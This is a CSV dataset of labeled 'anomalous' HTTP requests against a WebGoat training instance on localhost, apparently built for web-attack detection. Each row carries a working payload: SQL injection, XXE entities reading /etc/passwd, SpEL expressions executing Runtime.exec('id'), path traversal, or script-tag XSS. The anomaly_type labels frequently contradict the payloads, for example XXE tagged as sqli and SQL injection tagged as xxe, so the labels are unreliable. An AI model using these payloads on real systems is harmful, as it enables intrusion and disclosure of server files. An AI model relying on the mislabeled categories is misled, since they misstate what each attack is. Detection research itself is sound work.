request_id,timestamp,method,url,headers,body,app_target,anomaly_type,label
850,2025-12-06 21:30:00,GET,http://localhost:8080/WebGoat/Start.mvc?account=1' OR 1=1--,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",,WebGoat,xxe,anomalous
851,2025-12-06 21:40:00,GET,"http://localhost:8080/WebGoat/Start.mvc?<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>","{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",,WebGoat,sqli,anomalous
852,2025-12-06 21:50:00,POST,http://localhost:8080/WebGoat/a2/sql-injection,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",account=1' OR 1=1--,WebGoat,dom_xss,anomalous
853,2025-12-06 22:00:00,GET,http://localhost:8080/WebGoat/clientSideFiltering?account=1' OR 1=1--,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",,WebGoat,sqli,anomalous
854,2025-12-06 22:10:00,GET,http://localhost:8080/WebGoat/Start.mvc?#{T(java.lang.Runtime).getRuntime().exec('id')},"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",,WebGoat,sqli,anomalous
855,2025-12-06 22:20:00,POST,http://localhost:8080/WebGoat/Start.mvc,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",searchTerm=<script>alert(1)</script>,WebGoat,sqli,anomalous
856,2025-12-06 22:30:00,GET,"http://localhost:8080/WebGoat/xxe?<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>","{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/xxe""}",,WebGoat,sqli,anomalous
857,2025-12-06 22:40:00,GET,http://localhost:8080/WebGoat/SpEL?account=1' OR 1=1--,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/SpEL""}",,WebGoat,dom_xss,anomalous
858,2025-12-06 22:50:00,POST,http://localhost:8080/WebGoat/xxe,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",account=1' OR 1=1--,WebGoat,spel_injection,anomalous
859,2025-12-06 23:00:00,GET,"http://localhost:8080/WebGoat/clientSideFiltering?<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>","{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",,WebGoat,spel_injection,anomalous
860,2025-12-06 23:10:00,GET,http://localhost:8080/WebGoat/a2/sql-injection?account=1' OR 1=1--,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",,WebGoat,sqli,anomalous
861,2025-12-06 23:20:00,GET,http://localhost:8080/WebGoat/path-traversal?#{T(java.lang.Runtime).getRuntime().exec('id')},"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/path-traversal""}",,WebGoat,dom_xss,anomalous
862,2025-12-06 23:30:00,GET,http://localhost:8080/WebGoat/clientSideFiltering?../../../../etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",,WebGoat,spel_injection,anomalous
863,2025-12-06 23:40:00,GET,http://localhost:8080/WebGoat/Start.mvc?account=1' OR 1=1--,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",,WebGoat,dom_xss,anomalous
864,2025-12-06 23:50:00,POST,http://localhost:8080/WebGoat/a2/sql-injection,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",account=1' OR 1=1--,WebGoat,spel_injection,anomalous
865,2025-12-07 0:00:00,POST,http://localhost:8080/WebGoat/Start.mvc,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}","<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>",WebGoat,xxe,anomalous
866,2025-12-07 0:10:00,POST,http://localhost:8080/WebGoat/Start.mvc,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",lesson=2.1&menu=200&id=1' OR '1'='1,WebGoat,sqli,anomalous
867,2025-12-07 0:20:00,POST,http://localhost:8080/WebGoat/SpEL,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/SpEL""}",account=1' OR 1=1--,WebGoat,spel_injection,anomalous
868,2025-12-07 0:30:00,GET,http://localhost:8080/WebGoat/xxe?../../../../etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",,WebGoat,spel_injection,anomalous
869,2025-12-07 0:40:00,GET,http://localhost:8080/WebGoat/a2/sql-injection?../../../../etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",,WebGoat,xxe,anomalous
870,2025-12-07 0:50:00,POST,http://localhost:8080/WebGoat/SpEL,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/SpEL""}",../../../../etc/passwd,WebGoat,xxe,anomalous
871,2025-12-07 1:00:00,GET,http://localhost:8080/WebGoat/Start.mvc?#{T(java.lang.Runtime).getRuntime().exec('id')},"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",,WebGoat,path_traversal,anomalous
872,2025-12-07 1:10:00,POST,http://localhost:8080/WebGoat/path-traversal,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/path-traversal""}",account=1' OR 1=1--,WebGoat,sqli,anomalous
873,2025-12-07 1:20:00,GET,http://localhost:8080/WebGoat/a2/sql-injection?account=1' OR 1=1--,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",,WebGoat,xxe,anomalous
874,2025-12-07 1:30:00,POST,http://localhost:8080/WebGoat/a2/sql-injection,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",account=1' OR 1=1--,WebGoat,xxe,anomalous
875,2025-12-07 1:40:00,POST,http://localhost:8080/WebGoat/a2/sql-injection,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",#{T(java.lang.Runtime).getRuntime().exec('id')},WebGoat,sqli,anomalous
876,2025-12-07 1:50:00,POST,http://localhost:8080/WebGoat/Start.mvc,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}","<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>",WebGoat,sqli,anomalous
877,2025-12-07 2:00:00,GET,http://localhost:8080/WebGoat/xxe?../../../../etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",,WebGoat,dom_xss,anomalous
878,2025-12-07 2:10:00,POST,http://localhost:8080/WebGoat/path-traversal,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/path-traversal""}",#{T(java.lang.Runtime).getRuntime().exec('id')},WebGoat,spel_injection,anomalous
879,2025-12-07 2:20:00,POST,http://localhost:8080/WebGoat/path-traversal,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/path-traversal""}",searchTerm=<script>alert(1)</script>,WebGoat,xxe,anomalous
880,2025-12-07 2:30:00,POST,http://localhost:8080/WebGoat/xxe,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",lesson=2.1&menu=200&id=1' OR '1'='1,WebGoat,sqli,anomalous
881,2025-12-07 2:40:00,GET,"http://localhost:8080/WebGoat/a2/sql-injection?<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>","{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",,WebGoat,xxe,anomalous
882,2025-12-07 2:50:00,POST,http://localhost:8080/WebGoat/clientSideFiltering,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",lesson=2.1&menu=200&id=1' OR '1'='1,WebGoat,sqli,anomalous
883,2025-12-07 3:00:00,GET,http://localhost:8080/WebGoat/path-traversal?#{T(java.lang.Runtime).getRuntime().exec('id')},"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/path-traversal""}",,WebGoat,dom_xss,anomalous
884,2025-12-07 3:10:00,POST,http://localhost:8080/WebGoat/xxe,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",#{T(java.lang.Runtime).getRuntime().exec('id')},WebGoat,path_traversal,anomalous
885,2025-12-07 3:20:00,GET,"http://localhost:8080/WebGoat/Start.mvc?<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>","{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",,WebGoat,dom_xss,anomalous
886,2025-12-07 3:30:00,GET,http://localhost:8080/WebGoat/a2/sql-injection?account=1' OR 1=1--,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",,WebGoat,dom_xss,anomalous
887,2025-12-07 3:40:00,GET,http://localhost:8080/WebGoat/clientSideFiltering?#{T(java.lang.Runtime).getRuntime().exec('id')},"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",,WebGoat,dom_xss,anomalous
888,2025-12-07 3:50:00,GET,"http://localhost:8080/WebGoat/xxe?<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>","{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/xxe""}",,WebGoat,path_traversal,anomalous
889,2025-12-07 4:00:00,GET,http://localhost:8080/WebGoat/SpEL?account=1' OR 1=1--,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/SpEL""}",,WebGoat,path_traversal,anomalous
890,2025-12-07 4:10:00,GET,http://localhost:8080/WebGoat/path-traversal?../../../../etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/path-traversal""}",,WebGoat,sqli,anomalous
891,2025-12-07 4:20:00,POST,http://localhost:8080/WebGoat/xxe,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",account=1' OR 1=1--,WebGoat,sqli,anomalous
892,2025-12-07 4:30:00,GET,http://localhost:8080/WebGoat/xxe?lesson=2.1&menu=200&id=1' OR '1'='1,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",,WebGoat,sqli,anomalous
893,2025-12-07 4:40:00,POST,http://localhost:8080/WebGoat/SpEL,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/SpEL""}",../../../../etc/passwd,WebGoat,dom_xss,anomalous
894,2025-12-07 4:50:00,POST,http://localhost:8080/WebGoat/SpEL,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/SpEL""}",account=1' OR 1=1--,WebGoat,path_traversal,anomalous
895,2025-12-07 5:00:00,GET,http://localhost:8080/WebGoat/clientSideFiltering?../../../../etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",,WebGoat,path_traversal,anomalous
896,2025-12-07 5:10:00,POST,http://localhost:8080/WebGoat/clientSideFiltering,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",#{T(java.lang.Runtime).getRuntime().exec('id')},WebGoat,path_traversal,anomalous
897,2025-12-07 5:20:00,GET,http://localhost:8080/WebGoat/path-traversal?searchTerm=<script>alert(1)</script>,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/path-traversal""}",,WebGoat,xxe,anomalous
898,2025-12-07 5:30:00,GET,http://localhost:8080/WebGoat/path-traversal?searchTerm=<script>alert(1)</script>,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/path-traversal""}",,WebGoat,xxe,anomalous
899,2025-12-07 5:40:00,POST,http://localhost:8080/WebGoat/path-traversal,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/path-traversal""}",searchTerm=<script>alert(1)</script>,WebGoat,sqli,anomalous
900,2025-12-07 5:50:00,GET,http://localhost:8080/WebGoat/Start.mvc?lesson=2.1&menu=200&id=1' OR '1'='1,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",,WebGoat,sqli,anomalous
901,2025-12-07 6:00:00,GET,http://localhost:8080/WebGoat/SpEL?lesson=2.1&menu=200&id=1' OR '1'='1,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/SpEL""}",,WebGoat,xxe,anomalous
902,2025-12-07 6:10:00,POST,http://localhost:8080/WebGoat/Start.mvc,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",account=1' OR 1=1--,WebGoat,spel_injection,anomalous
903,2025-12-07 6:20:00,POST,http://localhost:8080/WebGoat/xxe,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",lesson=2.1&menu=200&id=1' OR '1'='1,WebGoat,dom_xss,anomalous
904,2025-12-07 6:30:00,POST,http://localhost:8080/WebGoat/path-traversal,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/path-traversal""}",lesson=2.1&menu=200&id=1' OR '1'='1,WebGoat,xxe,anomalous
905,2025-12-07 6:40:00,GET,http://localhost:8080/WebGoat/clientSideFiltering?#{T(java.lang.Runtime).getRuntime().exec('id')},"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",,WebGoat,spel_injection,anomalous
906,2025-12-07 6:50:00,GET,http://localhost:8080/WebGoat/Start.mvc?#{T(java.lang.Runtime).getRuntime().exec('id')},"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",,WebGoat,path_traversal,anomalous
907,2025-12-07 7:00:00,GET,http://localhost:8080/WebGoat/clientSideFiltering?lesson=2.1&menu=200&id=1' OR '1'='1,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",,WebGoat,spel_injection,anomalous
908,2025-12-07 7:10:00,GET,http://localhost:8080/WebGoat/Start.mvc?account=1' OR 1=1--,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",,WebGoat,path_traversal,anomalous
909,2025-12-07 7:20:00,POST,http://localhost:8080/WebGoat/a2/sql-injection,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",lesson=2.1&menu=200&id=1' OR '1'='1,WebGoat,sqli,anomalous
910,2025-12-07 7:30:00,GET,http://localhost:8080/WebGoat/xxe?#{T(java.lang.Runtime).getRuntime().exec('id')},"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",,WebGoat,dom_xss,anomalous
911,2025-12-07 7:40:00,GET,http://localhost:8080/WebGoat/clientSideFiltering?lesson=2.1&menu=200&id=1' OR '1'='1,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",,WebGoat,sqli,anomalous
912,2025-12-07 7:50:00,GET,http://localhost:8080/WebGoat/clientSideFiltering?account=1' OR 1=1--,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",,WebGoat,path_traversal,anomalous
913,2025-12-07 8:00:00,POST,http://localhost:8080/WebGoat/Start.mvc,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",lesson=2.1&menu=200&id=1' OR '1'='1,WebGoat,path_traversal,anomalous
914,2025-12-07 8:10:00,POST,http://localhost:8080/WebGoat/SpEL,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/SpEL""}",../../../../etc/passwd,WebGoat,path_traversal,anomalous
915,2025-12-07 8:20:00,GET,http://localhost:8080/WebGoat/xxe?searchTerm=<script>alert(1)</script>,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",,WebGoat,sqli,anomalous
916,2025-12-07 8:30:00,GET,"http://localhost:8080/WebGoat/a2/sql-injection?<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>","{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",,WebGoat,sqli,anomalous
917,2025-12-07 8:40:00,GET,http://localhost:8080/WebGoat/SpEL?searchTerm=<script>alert(1)</script>,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/SpEL""}",,WebGoat,path_traversal,anomalous
918,2025-12-07 8:50:00,POST,http://localhost:8080/WebGoat/SpEL,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/SpEL""}",#{T(java.lang.Runtime).getRuntime().exec('id')},WebGoat,dom_xss,anomalous
